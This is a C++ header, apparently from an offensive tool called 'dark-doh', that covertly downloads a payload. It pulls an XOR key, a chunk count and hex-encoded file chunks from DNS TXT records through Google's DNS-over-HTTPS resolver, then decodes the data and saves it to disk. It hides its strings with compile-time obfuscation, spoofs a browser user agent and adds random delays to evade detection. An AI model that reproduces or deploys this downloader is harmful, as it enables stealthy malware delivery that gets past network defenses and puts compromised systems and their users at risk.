#pragma once

// debug header
#include "dark-doh-debug.h"

// string2dword xorkey action
#include <sstream>

// string obfuscation
#include "headers/obfuscate.h"

using namespace rapidjson;

// log filename variable
LPCSTR filelog_name = AY_OBFUSCATE("dark-doh-log2.txt");

enum Results
{
	ERROR_INTERNET_READFILE = 8,
	ERROR_HELP_PARAM = 7,
	ERROR_CHUNKS_RECORD = 6,
	ERROR_DNS_RECORD = 5,
	ERROR_OPEN_HTTP_REQUEST = 4,
	ERROR_INTERNET_CONNECT = 3,
	ERROR_INTERNET_OPEN = 2,
	ERROR_SEND_REQUEST = 1,
	SUCCESS = 0,
	ERROR_PROVIDER_SELECTION = -1,
	ERROR_XKEY = -2,
	ERROR_DNS_REPLY = -3,
	ERROR_TOO_ANY_FAILURES = -4,
	ERROR_CRITICAL = -5
};

// const char* switch-case trick
uint64_t constexpr mixit(char m, uint64_t s)
{
	return ((s << 7) + ~(s >> 3)) + ~m;
}
uint64_t constexpr hashit(const char* m)
{
	return (*m) ? mixit(*m, hashit(m + 1)) : 0;
}

// DdClass
class DdClass
{
private:
	std::stringstream dwordStream{};
	LPCSTR host{};
	LPCSTR url_path{};
	DWORD dwFileSize = 4096;
	DWORD dwBufferSize = 4096;
	LPCSTR headers = AY_OBFUSCATE("Accept: application/dns-json");
	char* reqBuffer{};
	DWORD dwBytesRead{};
	BOOL bRead{};
	std::string failuredata = "retry-doh";
	int selector{};
	int chunkSize = ((rand() % 10) + 1) * 800;

// remove escaped quotes and space given by some DoH providers
	void remQuotes(std::string& input) 
	{
		input.erase(remove(input.begin(), input.end(), '"'), input.end());
		input.erase(remove(input.begin(), input.end(), ' '), input.end());
	};

// check errors and exit in case of critical errors
// https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-6
	void rcodeCheck(int status)
	{
		printf(AY_OBFUSCATE("Error code = %d, refer to 'https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml'\n"), status);
		debugfile((std::to_string(status).c_str()), AY_OBFUSCATE("Error occured: "), filelog_name);
		switch (status)
		{
		case 3: printf(AY_OBFUSCATE("Non-Existent Domain, exiting...")); exit(-5);
		}
		Sleep(((rand() % 30) + 1) * 100);
	}


	std::string parseJson(std::string json_data)
	{
		rapidjson::Document json_reply;
		json_reply.Parse(json_data.c_str());

		if (json_reply.IsObject() == true)
		{
			rapidjson::StringBuffer jbuffer;
			rapidjson::Writer<rapidjson::StringBuffer> writer(jbuffer);
			json_reply.Accept(writer);

			if (json_reply["Status"].GetInt() != 0)
			{
				errors++;
				if (errors == 100) { printf(AY_OBFUSCATE("Too many errors, exiting...")); exit(-4); }
				rcodeCheck(json_reply["Status"].GetInt());
				return "retry-doh";
			}

			return json_reply["Answer"][0]["data"].GetString();
		}
		else
		{
			return "retry-doh";
		}
	}

	std::string getDataViaDOH(LPCSTR host, LPCSTR url_path)
	{
		HINTERNET hSession = InternetOpenA(AY_OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (!hSession) { debugfile("", AY_OBFUSCATE("ERROR: 0x02: InternetOpenA error "), filelog_name); exit(2); }
		HINTERNET hConnect = InternetConnectA(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		if (!hConnect) { debugfile("", AY_OBFUSCATE("ERROR: 0x03: InternetConnectA error "), filelog_name); exit(3); }
		HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", url_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE |
			INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
		if (!hRequest) { debugfile("", AY_OBFUSCATE("ERROR: 0x04: HttpOpenRequestA error "), filelog_name); exit(4); }

		while (!HttpSendRequestA(hRequest, headers, -1L, 0, 0)) {

			printf(AY_OBFUSCATE("HttpSendRequestA error : (%lu)\n"), GetLastError());

			InternetErrorDlg(
				GetDesktopWindow(),
				hRequest,
				ERROR_INTERNET_CLIENT_AUTH_CERT_NEEDED,
				FLAGS_ERROR_UI_FILTER_FOR_ERRORS |
				FLAGS_ERROR_UI_FLAGS_GENERATE_DATA |
				FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS,
				NULL);

			debugfile((std::string(host) + std::string(url_path)).c_str(), AY_OBFUSCATE("ERROR: 0x01: HttpSendRequestA error "), filelog_name);
			exit(1);
		}

		std::string dnData = "";
		char* dnBuffer = new char[dwBufferSize];
		DWORD dwDataSize = 0;

		do {
			InternetQueryDataAvailable(hRequest, &dwDataSize, 0, 0);
			if (dwDataSize > dwBufferSize)
				dwDataSize = dwBufferSize;
			InternetReadFile(hRequest, dnBuffer, dwDataSize, &dwBytesRead);
			dnData.append(dnBuffer, dwDataSize);
		} while (dwDataSize != 0);

		InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);

		std::string parsed_data = parseJson(dnData);
		return parsed_data;
	};

public:
	DWORD xkey{};
	std::string dhostname;
	std::string durl_path;
	int chunks{};
	std::string filedata;
	int pSize = 0;
	int errors = 0;


	void selectProviderDOH(std::string prov, std::string& addr1, std::string& url1)
	{
		switch (hashit(prov.c_str()))
		{
		case hashit("google"):
			addr1 = AY_OBFUSCATE("dns.google.com"); url1 = AY_OBFUSCATE("/resolve?name=");
			break;
		case hashit("cloudflare"):
			std::cout << AY_OBFUSCATE("Error: No cloudflare configured, exiting...") << std::endl;
			exit(-1);
			break;
		case hashit("mix"):
			std::cout << AY_OBFUSCATE("Error: Mixing is not configured, exiting...") << std::endl;
			exit(-1);
			break;
		default:
			std::cout << AY_OBFUSCATE("Error: Not a valid provider has been submitted.") << std::endl;
			exit(-1);
			break;
		}
	};

	DWORD getKeyViaDOH(std::string filename, std::string provider, std::string dname)
	{
		selectProviderDOH(provider, dhostname, durl_path);

		durl_path += (filename + "0." + dname + "&type=TXT");
		std::string doh = getDataViaDOH(dhostname.c_str(), durl_path.c_str());
		remQuotes(doh);

		if (doh.empty()) { return -2; }

		for (const auto& i : doh)
		{
			dwordStream << std::hex << int(i);
		}
		dwordStream >> xkey;

		return (((xkey & 0x000000FF) << 24) + ((xkey & 0x0000FF00) << 8) +
			((xkey & 0x00FF0000) >> 8) + ((xkey & 0xFF000000) >> 24));
	};

	int getChunksViaDOH(std::string filename, std::string provider, std::string dname)
	{
		selectProviderDOH(provider, dhostname, durl_path);

		durl_path += (filename + "." + dname + "&type=TXT");

		std::string doh = getDataViaDOH(dhostname.c_str(), durl_path.c_str());
		remQuotes(doh);
		try { chunks = std::stoi(doh); }
		catch (std::exception&) { chunks = 0; }

		return chunks;
	};

	std::string getFileViaDOH(std::string filename, std::string provider, std::string dname, int chunks)
	{
		for (int i = 1; i <= chunks;)
		{
			selectProviderDOH(provider, dhostname, durl_path);

			std::string durl_path_datachunks = (durl_path + filename + std::to_string(i) + "." + dname + "&type=TXT");
			std::string tempdata = getDataViaDOH(dhostname.c_str(), durl_path_datachunks.c_str());
			remQuotes(tempdata);

			if (tempdata.find(failuredata) != std::string::npos)
			{
				std::cout << AY_OBFUSCATE("FAILURE: ") << durl_path_datachunks.c_str() << AY_OBFUSCATE("\n");
			}
			else
			{
				filedata += tempdata;
				std::cout << AY_OBFUSCATE("Chunk ") << std::to_string(i) << AY_OBFUSCATE(" downloaded.\n");
				i = i + 1;
			}
			Sleep(((rand() % 30) + 1) * 10);
		}
		printf(AY_OBFUSCATE("Task execution via DoH has been finished\n"));

		return filedata;
	};

	void xorDecode(DWORD xkey, const char* input, char* output, DWORD len)
	{
		for (DWORD i = 0; i < len; i += 4) {
			*(DWORD*)(output + i) = *(DWORD*)(input + i) ^ xkey;
		}
	};

	int anDecode(std::string rawData, LPCSTR dataP)
	{
		std::string tempInput = rawData;
		for (int i = 0; i < strlen(rawData.c_str()); i += chunkSize)
		{
			std::string tempSubStr = tempInput.substr(i, chunkSize);
			for (int j = 0; j < strlen(tempSubStr.c_str()) / 2; j++)
			{
				sscanf_s(tempSubStr.c_str() + (j * 2), AY_OBFUSCATE("%2hhx"), &dataP[pSize]);
				pSize++;
			}
		}

		return pSize;
	};


	void saveData(LPCSTR filedata, int filesize, std::string outfilename)
	{
		std::ofstream savefile(outfilename, std::ios::out | std::ios::binary);

		if (!savefile) { std::cout << AY_OBFUSCATE("Cannot open file ") << outfilename << AY_OBFUSCATE(" for writing!") << std::endl; exit(1); }

		for (int y = 0; y < filesize; y++) { savefile << filedata[y]; }
		savefile.close();
		std::cout << AY_OBFUSCATE("File saved: ") << outfilename << std::endl;
	};

};